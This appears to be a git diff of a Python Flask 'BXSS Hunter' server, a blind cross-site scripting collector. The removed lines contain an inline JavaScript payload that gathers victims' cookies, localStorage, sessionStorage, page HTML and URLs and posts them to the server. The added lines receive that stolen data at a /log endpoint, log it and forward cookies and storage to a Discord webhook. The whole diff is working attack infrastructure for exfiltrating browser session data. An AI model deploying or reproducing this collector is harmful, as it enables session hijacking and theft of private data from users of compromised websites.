@@ -1,75 +1,63 @@
-from flask import Flask, request, jsonify, Response
-from flask_cors import CORS
+from flask import Flask, request, jsonify
+import logging
 from datetime import datetime
-import os
-import json
 import requests
 from dotenv import load_dotenv
+import os
 
-# Load environment variables from .env
 load_dotenv()
+DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 
 app = Flask(__name__)
-CORS(app)
+logging.basicConfig(filename='bxss.log', level=logging.INFO)
 
-DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK_URL")
-
-@app.route('/', methods=['GET', 'POST'])
-def bxss_logger():
-    if request.method == 'GET':
-        # Return JS payload when <script src="..."> is loaded
-        js = f"""
-(async () => {{
-  try {{
-    const data = {{
-      url: location.href,
-      origin: location.origin,
-      referrer: document.referrer,
-      userAgent: navigator.userAgent,
-      cookies: document.cookie,
-      localStorage: JSON.stringify(localStorage),
-      sessionStorage: JSON.stringify(sessionStorage),
-      html: document.documentElement.outerHTML,
-      timestamp: new Date().toISOString()
-    }};
-
-    await fetch("{request.host_url}", {{
-      method: "POST",
-      headers: {{
-        "Content-Type": "application/json"
-      }},
-      body: JSON.stringify(data)
-    }});
-  }} catch (e) {{
-    console.error("BXSS script error:", e);
-  }}
-}})();
-"""
-        return Response(js, mimetype="application/javascript")
-
-    # POST request handling: store and forward the exfiltrated data
+def send_to_discord(data):
+    embed = {
+        "title": "🧠 BXSS Hunter Alert",
+        "color": 16711680,
+        "fields": [
+            {"name": "📍 URL", "value": data.get("url", "N/A"), "inline": False},
+            {"name": "🌐 Origin", "value": data.get("origin", "N/A"), "inline": True},
+            {"name": "📤 Referer", "value": data.get("referer", "N/A"), "inline": True},
+            {"name": "👤 User-Agent", "value": data.get("userAgent", "N/A")[:1024], "inline": False},
+            {"name": "🍪 Cookies", "value": data.get("cookies", "None")[:1024], "inline": False},
+            {"name": "📦 Local Storage", "value": data.get("localStorage", "N/A")[:1024], "inline": False},
+            {"name": "🕐 Time", "value": data.get("timestamp", "N/A"), "inline": True},
+            {"name": "🛠️ Payload URL", "value": data.get("payloadURL", "N/A"), "inline": True},
+            {"name": "🖥️ IP Address", "value": data.get("ip", "N/A"), "inline": True}
+        ],
+        "footer": {"text": "BXSS Logger"},
+    }
     try:
-        data = request.get_json(force=True)
-    except Exception:
-        return jsonify({"error": "Invalid JSON"}), 400
+        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
+    except Exception as e:
+        print(f"Failed to send Discord alert: {e}")
 
-    # Add IP address and server-side timestamp
-    data["ip"] = request.remote_addr
-    data["server_time"] = datetime.utcnow().isoformat()
+@app.route('/log', methods=['POST'])
+def log_data():
+    data = request.get_json()
+    data['ip'] = request.remote_addr
+    data['received_at'] = datetime.utcnow().isoformat()
 
-   # print("[BXSS] New Log:\n", json.dumps(data, indent=2))
+    log = "\n--- BXSS Report ---\n"
+    for key, val in data.items():
+        log += f"{key.upper()}:\n{val}\n\n"
+    log += "-------------------\n"
 
-    # Send to Discord webhook if set
-    if DISCORD_WEBHOOK:
-        try:
-            requests.post(DISCORD_WEBHOOK, json={
-                "content": f"📦 **BXSS Payload Log**\n```json\n{json.dumps(data, indent=2)}```"
-            })
-        except Exception as e:
-            print("[!] Failed to send to Discord:", e)
+    print(log)
+    logging.info(log)
 
-    return jsonify({"status": "ok"})
+    send_to_discord(data)
+    return jsonify({"status": "received"}), 200
 
+@app.route('/payload.js')
+def serve_payload():
+    with open('payload.js') as f:
+        return f.read(), 200, {'Content-Type': 'application/javascript'}
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
+@app.route('/')
+def index():
+    return 'BXSS Hunter Active.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
